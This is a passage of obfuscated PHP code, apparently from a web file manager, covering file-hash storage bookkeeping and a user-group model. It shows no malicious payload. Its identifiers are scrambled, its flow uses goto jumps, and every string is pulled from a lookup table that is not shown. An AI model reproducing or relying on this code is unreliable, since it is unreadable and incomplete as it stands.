$E–‹Œ ãñ˜, $Fæ‰—ÙíÑ‘) { goto cƒÉ¤ô‡Ùà; a†ìöÁÌçÛ: $F¥¹¬ªÇªØ = KodIO::defaultDriver(); $b¤â¸ãÄ÷ = array($Aã…‚ìË­é[513] => $B¥ä‡ê¼ã, $Aã…‚ìË­é[2060] => 1, $Aã…‚ìË­é[383] => $E–‹Œ ãñ˜, $Aã…‚ìË­é[732] => $F¥¹¬ªÇªØ[$Aã…‚ìË­é[364]], $Aã…‚ìË­é[384] => $E¹Îîİó, $Aã…‚ìË­é[2061] => $AùŠ‡³Ô÷á, $Aã…‚ìË­é[2062] => $b¤»Ğ²öÌ); return $b¤â¸ãÄ÷; goto bÜÊ‰‰ÔÆÑ; f›ˆ—Çâéù: $Cøáé¡Çà = get_path_this($E¹Îîİó); if ($Fæ‰—ÙíÑ‘) { $a‡Ó‚§ÜÔ¨ = IO::move($BòéäÉç…, $F”ÂÃ…’ä¼, !1, $Cøáé¡Çà); } else { $a‡Ó‚§ÜÔ¨ = IO::copy($BòéäÉç…, $F”ÂÃ…’ä¼, !1, $Cøáé¡Çà); } if (!$a‡Ó‚§ÜÔ¨) { return !1; } goto a†ìöÁÌçÛ; cƒÉ¤ô‡Ùà: $Aã…‚ìË­é =& $_SERVER[÷ÖêïÔÔÓ]; $E¹Îîİó = $this->createFileName($E–‹Œ ãñ˜); $F”ÂÃ…’ä¼ = get_path_father($E¹Îîİó); goto f›ˆ—Çâéù; bÜÊ‰‰ÔÆÑ: } public function addFileCheckExist($Dˆ˜¨òèÄ‚, $b³Š¬‘·‚ä, $B…Œ¨¨–±) { $EÉùáö¯ŸÜ =& $_SERVER[÷ÖêïÔÔÓ]; $Añ¾Ø×ªá¿ = $this->findByHash($Dˆ˜¨òèÄ‚, $b³Š¬‘·‚ä); if (!$Añ¾Ø×ªá¿) { return !1; } $dªËÅÌòáÖ = array($EÉùáö¯ŸÜ[2060] => intval($Añ¾Ø×ªá¿[$EÉùáö¯ŸÜ[2063]]) + 1, $EÉùáö¯ŸÜ[513] => $B…Œ¨¨–±); $this->where(array($EÉùáö¯ŸÜ[416] => $Añ¾Ø×ªá¿[$EÉùáö¯ŸÜ[415]]))->save($dªËÅÌòáÖ); return $Añ¾Ø×ªá¿; } public function remove($D±ÌŒ«ğ‡‰) { $this->linkCountChange($D±ÌŒ«ğ‡‰, !1); $this->clearEmpty(); return !0; } public function linkAdd($CÆÍò¤ÏÅë) { $this->linkCountChange($CÆÍò¤ÏÅë, !0); } public function linkCountChange($E«”¤„­ÇÓ, $f…êÙŒ¬î) { goto aé¿‹ªŞøÑ; fÒãâ˜Š¦ğ: $A¦ìêñ¬ñÆ = array(); foreach ($E«”¤„­ÇÓ as $d¾’´ø²é) { $eĞÜ ƒ¨ = $d¾’´ø²é . $b×ËÀ÷õ†¶[33]; if (!$A¦ìêñ¬ñÆ[$eĞÜ ƒ¨]) { $A¦ìêñ¬ñÆ[$eĞÜ ƒ¨] = 0; } $A¦ìêñ¬ñÆ[$eĞÜ ƒ¨]++; } $eñ„ä™µœÅ = array(); goto E£¦İ†¿; E£¦İ†¿: foreach ($A¦ìêñ¬ñÆ as $d¾’´ø²é => $AÉ÷ãÌ—Á„) { $eĞÜ ƒ¨ = $AÉ÷ãÌ—Á„ . $b×ËÀ÷õ†¶[33]; if (!$eñ„ä™µœÅ[$eĞÜ ƒ¨]) { $eñ„ä™µœÅ[$eĞÜ ƒ¨] = array(); } $eñ„ä™µœÅ[$eĞÜ ƒ¨][] = $d¾’´ø²é; } foreach ($eñ„ä™µœÅ as $AÉ÷ãÌ—Á„ => $c¬î™ìå¥) { if (!$c¬î™ìå¥) { continue; } $AÉ÷ãÌ—Á„ = $f…êÙŒ¬î ? $AÉ÷ãÌ—Á„ : -intval($AÉ÷ãÌ—Á„); $aÈŒ‚”Å” = array($b×ËÀ÷õ†¶[415] => array($b×ËÀ÷õ†¶[7], $c¬î™ìå¥)); if ($AÉ÷ãÌ—Á„ < 0) { $aÈŒ‚”Å”[$b×ËÀ÷õ†¶[2063]] = array($b×ËÀ÷õ†¶[925], abs($AÉ÷ãÌ—Á„)); } $this->where($aÈŒ‚”Å”)->setAdd($b×ËÀ÷õ†¶[2063], $AÉ÷ãÌ—Á„); } goto E®õ…¸¥°; aé¿‹ªŞøÑ: $b×ËÀ÷õ†¶ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$E«”¤„­ÇÓ) { return; } if (!is_array($E«”¤„­ÇÓ)) { $E«”¤„­ÇÓ = array($E«”¤„­ÇÓ); } goto fÒãâ˜Š¦ğ; E®õ…¸¥°: } public function findByHash($DÔèµèˆ, $Dò¢Ñö…ç = false) { $d¬³º‰¸ò =& $_SERVER[÷ÖêïÔÔÓ]; if (!$DÔèµèˆ && !$Dò¢Ñö…ç) { return !1; } $CğŞâç¦®¡ = array($d¬³º‰¸ò[2061] => $DÔèµèˆ); if ($Dò¢Ñö…ç) { $CğŞâç¦®¡ = array($d¬³º‰¸ò[2062] => $Dò¢Ñö…ç); } return $this->order($d¬³º‰¸ò[2064])->where($CğŞâç¦®¡)->find(); } public function clearEmpty($AˆœÄ¨ò–¾ = 0) { goto AèÏÇŞè; AèÏÇŞè: $aö£ØÉó…Ó =& $_SERVER[÷ÖêïÔÔÓ]; $b±¾—ì¢ğ× = time() - 3600 * 24 * $AˆœÄ¨ò–¾; $DƒËÌÍ‘İ™ = $aö£ØÉó…Ó[2065] . $b±¾—ì¢ğ×; goto dÜ®Ã‘Ï”; Cã³á’ÉäÆ: foreach ($FËßÊïâ¡ó as $Aƒ—ß¹ËÏÆ) { $a”Ê•ò²œÉ->update(1); $this->resetFile($Aƒ—ß¹ËÏÆ); } $a”Ê•ò²œÉ->end(); goto FäŸÎİàµ«; dÜ®Ã‘Ï”: $FËßÊïâ¡ó = $this->where($DƒËÌÍ‘İ™)->select(); if (!$FËßÊïâ¡ó) { return; } $a”Ê•ò²œÉ = new Task($aö£ØÉó…Ó[2066], $aö£ØÉó…Ó[33], count($FËßÊïâ¡ó)); goto Cã³á’ÉäÆ; FäŸÎİàµ«: } private function resetFile($Dèëï¨à¶”) { goto CĞ¯õ“¦ƒ; CĞ¯õ“¦ƒ: $CÏ³áïæ¡÷ =& $_SERVER[÷ÖêïÔÔÓ]; $DõÀÆš±øÌ = array($CÏ³áïæ¡÷[416] => $Dèëï¨à¶”[$CÏ³áïæ¡÷[415]]); $FËª¥Îòª = Model($CÏ³áïæ¡÷[1077])->where($DõÀÆš±øÌ)->count(); goto b‡Ğæã«Ò; b‡Ğæã«Ò: $eëì†¥·—† = Model($CÏ³áïæ¡÷[2067])->where($DõÀÆš±øÌ)->count(); $D°ÉÆÆß÷Ë = intval($FËª¥Îòª) + intval($eëì†¥·—†); if ($D°ÉÆÆß÷Ë == 0) { IO::remove($Dèëï¨à¶”[$CÏ³áïæ¡÷[76]]); $this->where($DõÀÆš±øÌ)->delete(); $this->metaSet($Dèëï¨à¶”[$CÏ³áïæ¡÷[415]], null, null); return; } goto Aè•Ä¼Ã‹³; Aè•Ä¼Ã‹³: if ($Dèëï¨à¶”[$CÏ³áïæ¡÷[2063]] != $D°ÉÆÆß÷Ë) { $this->where($DõÀÆš±øÌ)->save(array($CÏ³áïæ¡÷[2060] => $D°ÉÆÆß÷Ë)); } goto eŒµò½ÛÉ; eŒµò½ÛÉ: } public function storageInfo($A¿Ç¡ÔÂ = false) { goto c‰åï¾“î; c‰åï¾“î: $E—¢«¤ŠÓ =& $_SERVER[÷ÖêïÔÔÓ]; $fÜá¡¬ˆ = $this->count() + 0.0; $AÕÕ£„»©‰ = 0; goto CÒ†­î®˜÷; CÒ†­î®˜÷: $C·ªï¯ˆ˜ï = 1; $f«÷‘ª¶‰¿ = 0; $BÜĞò·… = 5000; goto dëˆä³‡å; dëˆä³‡å: for ($EÁ°„÷çİï = 0; $EÁ°„÷çİï < $fÜá¡¬ˆ; $EÁ°„÷çİï = $EÁ°„÷çİï + $BÜĞò·…) { $dËğšŞò–· = $this->limit($EÁ°„÷çİï, $EÁ°„÷çİï + $BÜĞò·…)->select(); foreach ($dËğšŞò–· as $dæèíŠ‹µë) { $C·ªï¯ˆ˜ï += $dæèíŠ‹µë[$E—¢«¤ŠÓ[78]] * $dæèíŠ‹µë[$E—¢«¤ŠÓ[2063]]; $AÕÕ£„»©‰ += $dæèíŠ‹µë[$E—¢«¤ŠÓ[78]] * ($dæèíŠ‹µë[$E—¢«¤ŠÓ[2063]] - 1); $f«÷‘ª¶‰¿ += $dæèíŠ‹µë[$E—¢«¤ŠÓ[2063]]; } } $dŞÃÛËë‰ = array($E—¢«¤ŠÓ[2068] => $C·ªï¯ˆ˜ï, $E—¢«¤ŠÓ[2069] => $AÕÕ£„»©‰, $E—¢«¤ŠÓ[2070] => $AÕÕ£„»©‰ / $C·ªï¯ˆ˜ï, $E—¢«¤ŠÓ[82] => $fÜá¡¬ˆ, $E—¢«¤ŠÓ[2071] => $f«÷‘ª¶‰¿); return $dŞÃÛËë‰; goto dî¦§ÀÊÏ²; dî¦§ÀÊÏ²: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\x70"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\145" => "\147\162\157\165\160\x5f\x6d\x65\164\x61", "\155\145\x74\141\106\x69\145\x6c\144" => "\147\x72\x6f\165\x70\111\104"); protected function cacheFunctionAlias($F­®’È™â¨) { $D„°õÃßöÛ =& $_SERVER[÷ÖêïÔÔÓ]; return array($D„°õÃßöÛ[2072] => array($F­®’È™â¨[0], $D„°õÃßöÛ[2073]), $D„°õÃßöÛ[2074] => array($F­®’È™â¨[0], $D„°õÃßöÛ[2073])); } protected function getInfo($fá‡ËŠ³) { $C§ßâîÖÕ = $this->getInfoSimple($fá‡ËŠ³); if (!$C§ßâîÖÕ) { return !1; } return $this->_listDataApplyItem($C§ßâîÖÕ); } protected function getInfoSimple($e«©ˆììŒ†, $f„¹Øñæ¹¹ = false) { $A‚ï‚©á =& $_SERVER[÷ÖêïÔÔÓ]; if ($f„¹Øñæ¹¹) { $E¿‚¾ŞÙÜæ = array($A‚ï‚©á[2004] => intval($e«©ˆììŒ†)); return $this->where($E¿‚¾ŞÙÜæ)->find(); } return $this->cacheFunctionGet($A‚ï‚©á[2075], $e«©ˆììŒ†); } protected function groupAdd($eĞø°—¢ä¹) { goto B²×Á‚İ…; Cù˜©‚ã: $CääÊóî = $this->add($fš¹¶âÎÕ¨); $this->setNamePinyin($CääÊóî, $fš¹¶âÎÕ¨[$fÙ–×éˆˆ¦[28]]); Model($fÙ–×éˆˆ¦[1077])->groupRootAdd($CääÊóî); goto Cà°†ÒÉ–Ö; Cà°†ÒÉ–Ö: return $CääÊóî; goto EĞÁÕŒ; B²×Á‚İ…: $fÙ–×éˆˆ¦ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$eĞø°—¢ä¹[$fÙ–×éˆˆ¦[457]] && isset($eĞø°—¢ä¹[$fÙ–×éˆˆ¦[2004]]) && $eĞø°—¢ä¹[$fÙ–×éˆˆ¦[2004]] == 1) { if ($f™Š©êÃĞ = $this->getInfoSimple($eĞø°—¢ä¹[$fÙ–×éˆˆ¦[2004]], !0)) { return $eĞø°—¢ä¹[$fÙ–×éˆˆ¦[2004]]; } } else { $f™Š©êÃĞ = $this->getInfoSimple($eĞø°—¢ä¹[$fÙ–×éˆˆ¦[457]]); if (!$f™Š©êÃĞ) { return !1; } } $có·›ê°¡ğ = $fÙ–×éˆˆ¦[2076]; goto eŞ™ª¨ô‹¨; eŞ™ª¨ô‹¨: if ($f™Š©êÃĞ[$fÙ–×éˆˆ¦[455]]) { $có·›ê°¡ğ = $f™Š©êÃĞ[$fÙ–×éˆˆ¦[455]] . $f™Š©êÃĞ[$fÙ–×éˆˆ¦[2004]] . $fÙ–×éˆˆ¦[47]; } $fš¹¶âÎÕ¨ = array($fÙ–×éˆˆ¦[383] => $this->groupNameAuto($eĞø°—¢ä¹[$fÙ–×éˆˆ¦[457]], $eĞø°—¢ä¹[$fÙ–×éˆˆ¦[28]]), $fÙ–×éˆˆ¦[365] => $eĞø°—¢ä¹[$fÙ–×éˆˆ¦[457]], $fÙ–×éˆˆ¦[518] => $có·›ê°¡ğ, $fÙ–×éˆˆ¦[2077] => $eĞø°—¢ä¹[$fÙ–×éˆˆ¦[1988]], $fÙ–×éˆˆ¦[2078] => 0, $fÙ–×éˆˆ¦[2008] => 0); if (!empty($eĞø°—¢ä¹[$fÙ–×éˆˆ¦[2004]])) { $fš¹¶âÎÕ¨[$fÙ–×éˆˆ¦[2004]] = $eĞø°—¢ä¹[$fÙ–×éˆˆ¦[2004]]; } goto Cù˜©‚ã; EĞÁÕŒ: } protected function groupEdit($Dƒ•¤ÏÔÛÉ, $DÓÇºãÙ††) { $AèŞ¥‚¦Œó =& $_SERVER[÷ÖêïÔÔÓ]; if (!empty($DÓÇºãÙ††[$AèŞ¥‚¦Œó[457]])) { $d†‚Î£¥º = $this->getInfoSimple($Dƒ•¤ÏÔÛÉ); $C¿¡…†“º = $this->getInfoSimple($DÓÇºãÙ††[$AèŞ¥‚¦Œó[457]]); if (!$d†‚Î£¥º || !$C¿¡…†“º) { return !1; } if ($DÓÇºãÙ††[$AèŞ¥‚¦Œó[457]] != $d†‚Î£¥º[$AèŞ¥‚¦Œó[457]]) { if ($C¿¡…†“º[$AèŞ¥‚¦Œó[455]] !== $d†‚Î£¥º[$AèŞ¥‚¦Œó[455]] && strpos($C¿¡…†“º[$AèŞ¥‚¦Œó[455]], $d†‚Î£¥º[$AèŞ¥‚¦Œó[455]]) === 0) { return !1; } $DÓÇºãÙ††[$AèŞ¥‚¦Œó[518]] = $C¿¡…†“º[$AèŞ¥‚¦Œó[455]] . $DÓÇºãÙ††[$AèŞ¥‚¦Œó[457]] . $AèŞ¥‚¦Œó[47]; $this->_changeChildLevel($d†‚Î£¥º, $C¿¡…†“º); } } if (isset($DÓÇºãÙ††[$AèŞ¥‚¦Œó[28]])) { $this->setNamePinyin($Dƒ•¤ÏÔÛÉ, $DÓÇºãÙ††[$AèŞ¥‚¦Œó[28]]); } return $this->where(array($AèŞ¥‚¦Œó[2079] => $Dƒ•¤ÏÔÛÉ))->save($DÓÇºãÙ††); } private function _changeChildLevel($cÜø±ÔŠÂÉ, $EãÇˆƒª—é, $Få—š’Ãæ = false) { goto cÈÇŞÆÖª; BŞ©—¢ã„‹: $this->where($d¼ò²ö ¡)->data($dŒÁæ÷»äß)->save(); goto A¶‚™¢¹¯›; EŞâ¸Ö‰šÌ: if ($Få—š’Ãæ) { $CÈ¡°‚×š… = $EãÇˆƒª—é[$eÆøÌÑæ»Š[455]] . $EãÇˆƒª—é[$eÆøÌÑæ»Š[2004]] . $eÆøÌÑæ»Š[47]; } $d¼ò²ö ¡ = array($eÆøÌÑæ»Š[518] => array($eÆøÌÑæ»Š[475], $cÜø±ÔŠÂÉ[$eÆøÌÑæ»Š[455]] . $cÜø±ÔŠÂÉ[$eÆøÌÑæ»Š[2004]] . $eÆøÌÑæ»Š[476])); $dŒÁæ÷»äß = array($eÆøÌÑæ»Š[518] => array($eÆøÌÑæ»Š[526], "\x72\145\160\154\141\143\145\x28\x70\x61\162\145\156\x74\114\x65\x76\145\154\x2c\47{$e™ƒšÏôöé}\x27\54\x27{$CÈ¡°‚×š…}\x27\51")); goto BŞ©—¢ã„‹; cÈÇŞÆÖª: $eÆøÌÑæ»Š =& $_SERVER[÷ÖêïÔÔÓ]; $e™ƒšÏôöé = $cÜø±ÔŠÂÉ[$eÆøÌÑæ»Š[455]] . $cÜø±ÔŠÂÉ[$eÆøÌÑæ»Š[2004]] . $eÆøÌÑæ»Š[47]; $CÈ¡°‚×š… = $EãÇˆƒª—é[$eÆøÌÑæ»Š[455]] . $EãÇˆƒª—é[$eÆøÌÑæ»Š[2004]] . $eÆøÌÑæ»Š[47] . $cÜø±ÔŠÂÉ[$eÆøÌÑæ»Š[2004]] . $eÆøÌÑæ»Š[47]; goto EŞâ¸Ö‰šÌ; A¶‚™¢¹¯›: } public function setNamePinyin($f˜Ö‡ÇÄÜ®, $Cˆ„­Ü­˜ = false) { $bµĞ’¥ùåŸ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$Cˆ„­Ü­˜) { $fâ‡æÖ› ª = $this->getInfoSimple($f˜Ö‡ÇÄÜ®); $Cˆ„­Ü­˜ = $fâ‡æÖ› ª[$bµĞ’¥ùåŸ[28]]; } if (!Input::check($Cˆ„­Ü­˜, $bµĞ’¥ùåŸ[520])) { $this->metaSet($f˜Ö‡ÇÄÜ®, $bµĞ’¥ùåŸ[412], null); $this->metaSet($f˜Ö‡ÇÄÜ®, $bµĞ’¥ùåŸ[411], null); return; } $aÌƒ¤§Åç = array($bµĞ’¥ùåŸ[412] => str_replace($bµĞ’¥ùåŸ[50], $bµĞ’¥ùåŸ[33], Pinyin::encode($Cˆ„­Ü­˜)), $bµĞ’¥ùåŸ[411] => Pinyin::encode($Cˆ„­Ü­˜, $bµĞ’¥ùåŸ[521])); $this->metaSet($f˜Ö‡ÇÄÜ®, $aÌƒ¤§Åç); } protected function groupRemove($BŸØÃôÁ‚Œ) { goto AÑ¥©Ê¼¬–; AÑ¥©Ê¼¬–: $bÙê“ƒôøÙ =& $_SERVER[÷ÖêïÔÔÓ]; $C²›è¶²¨Ñ = array($bÙê“ƒôøÙ[2004] => $BŸØÃôÁ‚Œ); $Eäğ¢†— = $this->where($C²›è¶²¨Ñ)->find(); goto BœØÀØ­øˆ; C‚±ƒ •ã: Model($bÙê“ƒôøÙ[748])->groupRootRemove($BŸØÃôÁ‚Œ); return $this->where($C²›è¶²¨Ñ)->delete(); goto aã³³Š; bìàèâ‹ò: $this->where(array($bÙê“ƒôøÙ[457] => $BŸØÃôÁ‚Œ))->save(array($bÙê“ƒôøÙ[457] => $Eäğ¢†—[$bÙê“ƒôøÙ[457]])); Model($bÙê“ƒôøÙ[2080])->where($C²›è¶²¨Ñ)->delete(); Model($bÙê“ƒôøÙ[2081])->where($C²›è¶²¨Ñ)->delete(); goto C‚±ƒ •ã; BœØÀØ­øˆ: if (!$Eäğ¢†— || $Eäğ¢†—[$bÙê“ƒôøÙ[457]] == 0) { return !1; } $D÷øÄĞêÍ = $this->getInfoSimple($Eäğ¢†—[$bÙê“ƒôøÙ[457]]); $this->_changeChildLevel($Eäğ¢†—, $D÷øÄĞêÍ, !0); goto bìàèâ‹ò; aã³³Š: } public function listData() { $eš×´ë©¤Ô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eš×´ë©¤Ô[$_SERVER[÷ÖêïÔÔÓ][350]]); return $eš×´ë©¤Ô; } private function _makeOrder($B†µ‡·µİº = '') { goto d†¦È×Èºó; aò‘ˆ­²Ã: $AÇÙ’Ç¢ÌÖ = Input::get($DÖÌõ”‘[403], $DÖÌõ”‘[7], $DÖÌõ”‘[2079], $Fõ´‘¯ƒ§); $B±…ÆÈéèç = Input::get($DÖÌõ”‘[404], $DÖÌõ”‘[7], $DÖÌõ”‘[2082], array($DÖÌõ”‘[2082], $DÖÌõ”‘[400])); $B±…ÆÈéèç = $A©šÜ¿˜êõ[$B±…ÆÈéèç]; goto f³–Š‚ç; d†¦È×Èºó: $DÖÌõ”‘ =& $_SERVER[÷ÖêïÔÔÓ]; $Fõ´‘¯ƒ§ = array($DÖÌõ”‘[2004], $DÖÌõ”‘[28], $DÖÌõ”‘[1990], $DÖÌõ”‘[184]); $A©šÜ¿˜êõ = array($DÖÌõ”‘[398] => $DÖÌõ”‘[399], $DÖÌõ”‘[400] => $DÖÌõ”‘[401]); goto aò‘ˆ­²Ã; f³–Š‚ç: $B†µ‡·µİº = $B†µ‡·µİº . "{$AÇÙ’Ç¢ÌÖ}\40{$B±…ÆÈéèç}\54\x20\147\x72\x6f\x75\x70\111\x44\40\141\x73\143"; return $this->order($B†µ‡·µİº); goto CÏŒ©¾ˆš©; CÏŒ©¾ˆš©: } public function listChild($D‘ˆ‚¾÷Á) { $bâĞ¯À¶™ =& $_SERVER[÷ÖêïÔÔÓ]; $E¿ç£Ú‰ = $this->where(array($bâĞ¯À¶™[457] => $D‘ˆ‚¾÷Á))->_makeOrder()->selectPage(200); $this->_listDataApply($E¿ç£Ú‰[$bâĞ¯À¶™[350]]); return $E¿ç£Ú‰; } public function listByID($Dñ–Âà£„¸) { $eî¶ã½§©‡ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$Dñ–Âà£„¸) { return array(); } $CÊ£Å”‚Ğã = array($eî¶ã½§©‡[2004] => array($eî¶ã½§©‡[7], $Dñ–Âà£„¸)); $F´Ó¡à¿òò = $this->where($CÊ£Å”‚Ğã)->select(); $this->_listDataApply($F´Ó¡à¿òò); return $F´Ó¡à¿òò; } public function listSearch($A²¯Ï³èö) { goto A‚ÕÈ·¥áœ; bÀ‡çÂ»: if (!trim($F—¾È’î)) { return !1; } $F—¾È’î = str_replace($D»¡ìÕèÍé[2085], $D»¡ìÕèÍé[2086], $F—¾È’î); $DÕªÍ›‰Œ¸ = array($D»¡ìÕèÍé[2004] => array($D»¡ìÕèÍé[747], "\x25{$F—¾È’î}\x25"), $D»¡ìÕèÍé[28] => array($D»¡ìÕèÍé[747], "\x25{$F—¾È’î}\x25"), $D»¡ìÕèÍé[910] => $D»¡ìÕèÍé[2087]); goto aïÖÍ‰“ã; dª÷÷íºô©: $this->_listDataApply($c‰šìí®ØÊ[$D»¡ìÕèÍé[350]]); return $c‰šìí®ØÊ; goto AÇ•øÅ˜½; aïÖÍ‰“ã: $c‰šìí®ØÊ = $this->_makeOrder()->where($DÕªÍ›‰Œ¸)->selectPage(20); $c‰šìí®ØÊ = $c‰šìí®ØÊ ? $c‰šìí®ØÊ : array(); if (!$c‰šìí®ØÊ || count($c‰šìí®ØÊ[$D»¡ìÕèÍé[350]]) < 5 && Input::check($F—¾È’î, $D»¡ìÕèÍé[303])) { $døĞ÷ÚéàÉ = $this->_searchFromMeta($D»¡ìÕèÍé[411], $F—¾È’î, 10); $e›·à—£ˆ¬ = $this->_searchFromMeta($D»¡ìÕèÍé[412], $F—¾È’î, 10); $F—äºö‚ = array_merge($døĞ÷ÚéàÉ, $e›·à—£ˆ¬, $c‰šìí®ØÊ[$D»¡ìÕèÍé[350]]); $c‰šìí®ØÊ[$D»¡ìÕèÍé[350]] = array_unique_by_key($F—äºö‚, $D»¡ìÕèÍé[2004]); $c‰šìí®ØÊ[$D»¡ìÕèÍé[347]][$D»¡ìÕèÍé[348]] = count($c‰šìí®ØÊ[$D»¡ìÕèÍé[350]]); $c‰šìí®ØÊ[$D»¡ìÕèÍé[347]][$D»¡ìÕèÍé[349]] = ceil($c‰šìí®ØÊ[$D»¡ìÕèÍé[347]][$D»¡ìÕèÍé[348]] / $c‰šìí®ØÊ[$D»¡ìÕèÍé[347]][$D»¡ìÕèÍé[345]]); } goto dª÷÷íºô©; A‚ÕÈ·¥áœ: $D»¡ìÕèÍé =& $_SERVER[÷ÖêïÔÔÓ]; $F—¾È’î = $A²¯Ï³èö[$D»¡ìÕèÍé[2083]]; $c¡‰íÒŒø = isset($A²¯Ï³èö[$D»¡ìÕèÍé[2084]]) ? $A²¯Ï³èö[$D»¡ìÕèÍé[2084]] : !1; goto bÀ‡çÂ»; AÇ•øÅ˜½: } private function _searchFromMeta($b¹Ï‰ÔÚ´á, $Aöë­º§–©, $AĞ–˜×òÏ) { goto FŸëª±‚à; då‹áî²Ú: $E…’Ø…¡¦ = Model($f·ß–¢¦§×[2088])->where($bÅÙ¦ª »Ï)->limit($AĞ–˜×òÏ)->select(); if (!$E…’Ø…¡¦) { return array(); } $E…’Ø…¡¦ = array_to_keyvalue($E…’Ø…¡¦, $f·ß–¢¦§×[33], $f·ß–¢¦§×[2004]); goto báˆÜ˜ÓÁ; báˆÜ˜ÓÁ: $A³…Œ”Ûƒ = $this->where(array($f·ß–¢¦§×[2079] => array($f·ß–¢¦§×[7], $E…’Ø…¡¦)))->select(); if (!$A³…Œ”Ûƒ) { return array(); } return $A³…Œ”Ûƒ; goto dî¿”ñ»˜; FŸëª±‚à: $f·ß–¢¦§× =& $_SERVER[÷ÖêïÔÔÓ]; $Aöë­º§–© = strtolower($Aöë­º§–©); $bÅÙ¦ª »Ï = array($f·ß–¢¦§×[88] => $b¹Ï‰ÔÚ´á, $f·ß–¢¦§×[354] => array($f·ß–¢¦§×[747], "\x25{$Aöë­º§–©}\x25")); goto då‹áî²Ú; dî¿”ñ»˜: } protected function _listDataApplyItem($C±¼Ş¿ù¾ß) { $CÙîîÏÃ‹Ô = array($C±¼Ş¿ù¾ß); $this->_listDataApply($CÙîîÏÃ‹Ô); return $CÙîîÏÃ‹Ô[0]; } protected function _listDataApply(&$BŸ·Æî‚ä‘) { goto e‰öˆøˆ…Ñ; eÙ¾†‚Ã˜£: $this->_listAppendParent($BŸ·Æî‚ä‘); $this->_listAppendSourceRoot($BŸ·Æî‚ä‘, $DªŸŒÒë¥ï); goto A«Ò•ç–Ï; Cˆå›„´¾: $this->_listAppendChildren($BŸ·Æî‚ä‘); $this->_listAppendChildrenMember($BŸ·Æî‚ä‘); $this->_listAppendMeta($BŸ·Æî‚ä‘, $DªŸŒÒë¥ï); goto eÙ¾†‚Ã˜£; e‰öˆøˆ…Ñ: $cß„÷šÑ › =& $_SERVER[÷ÖêïÔÔÓ]; if (!$BŸ·Æî‚ä‘) { return; } $DªŸŒÒë¥ï = array_to_keyvalue($BŸ·Æî‚ä‘, $cß„÷šÑ ›[33], $cß„÷šÑ ›[2004]); goto Cˆå›„´¾; A«Ò•ç–Ï: } private function _listAppendChildren(&$Dõ¥ÏÈ«î¡) { goto BŒ³ñ¥øò™; FĞÖÇÌÑ: $C·Üº‡Òâé = count($Dõ¥ÏÈ«î¡); $aõÜãñ£‚ö = $this->tablePrefix . $this->tableName; for ($b†¤ÕàóË = 0, $FêÃÂ¸î—¯ = 0; $b†¤ÕàóË < $C·Üº‡Òâé; $b†¤ÕàóË++) { $FêÃÂ¸î—¯++; $B·İ÷Î›Èæ = $Dõ¥ÏÈ«î¡[$b†¤ÕàóË][$eŞ¼İŸÛÛî[2004]]; $eá²±õñ·í .= "\x53\105\x4c\105\103\124\x20\x2a\40\106\122\x4f\x4d\x20\x28\x53\105\x4c\105\103\x54\40\47{$B·İ÷Î›Èæ}\137\x63\x68\151\154\144\47\40\141\x73\40\x68\141\x73\x20\x46\x52\x4f\115\40\140{$aõÜãñ£‚ö}\x60\x20\x77\150\x65\x72\x65\40\x70\141\162\145\x6e\x74\x49\x44\x3d{$B·İ÷Î›Èæ}\40\154\x69\155\151\x74\40\61\51\x20\x61\x73\40\164\142\137{$B·İ÷Î›Èæ}\x20\x75\x6e\151\x6f\156\x20\141\154\154\x20"; if (($FêÃÂ¸î—¯ >= 20 || $b†¤ÕàóË == $C·Üº‡Òâé - 1) && $eá²±õñ·í) { $eá²±õñ·í = substr($eá²±õñ·í, 0, -strlen($eŞ¼İŸÛÛî[445])); $bÉ‹Ş®Šë„ = $this->query($eá²±õñ·í); $b´³ä³®ÈÛ = array_merge($b´³ä³®ÈÛ, $bÉ‹Ş®Šë„); $FêÃÂ¸î—¯ = 0; $eá²±õñ·í = $eŞ¼İŸÛÛî[33]; } } goto Dƒ·«ªÇ‘; Dƒ·«ªÇ‘: $b´³ä³®ÈÛ = array_to_keyvalue($b´³ä³®ÈÛ, $eŞ¼İŸÛÛî[446]); foreach ($Dõ¥ÏÈ«î¡ as &$A•ä™¾ÍìÄ) { $A•ä™¾ÍìÄ[$eŞ¼İŸÛÛî[2089]] = isset($b´³ä³®ÈÛ[$A•ä™¾ÍìÄ[$eŞ¼İŸÛÛî[2004]] . $eŞ¼İŸÛÛî[2090]]); } goto f´óÁŠÀ‘; BŒ³ñ¥øò™: $eŞ¼İŸÛÛî =& $_SERVER[÷ÖêïÔÔÓ]; $eá²±õñ·í = $eŞ¼İŸÛÛî[358]; $b´³ä³®ÈÛ = array(); goto FĞÖÇÌÑ; f´óÁŠÀ‘: } private function _listAppendChildrenMember(&$b†­œÆ²©) { goto b´¿çÜö¢; b´¿çÜö¢: $DÚ´ƒó†òÒ =& $_SERVER[÷ÖêïÔÔÓ]; $A½¾´ÁéŸ = $DÚ´ƒó†òÒ[358]; $Bˆ­«Æ…ù¾ = array(); goto dèç°’í²; Aè „Ş½†ƒ: $Bˆ­«Æ…ù¾ = array_to_keyvalue($Bˆ­«Æ…ù¾, $DÚ´ƒó†òÒ[446]); foreach ($b†­œÆ²© as &$DÛÍ‘¹®À) { $DÛÍ‘¹®À[$DÚ´ƒó†òÒ[2091]] = isset($Bˆ­«Æ…ù¾[$DÛÍ‘¹®À[$DÚ´ƒó†òÒ[2004]] . $DÚ´ƒó†òÒ[2090]]); } goto aìÊŸ³ˆó¬; dèç°’í²: $Dˆ³šˆˆö = count($b†­œÆ²©); $a¦ÀÖÂÛŒ = $this->tablePrefix . $DÚ´ƒó†òÒ[2081]; for ($f‡›Ö×ãßò = 0, $E’í…‰÷Ñ² = 0; $f‡›Ö×ãßò < $Dˆ³šˆˆö; $f‡›Ö×ãßò++) { $E’í…‰÷Ñ²++; $fäå½®‹é¹ = $b†­œÆ²©[$f‡›Ö×ãßò][$DÚ´ƒó†òÒ[2004]]; $A½¾´ÁéŸ .= 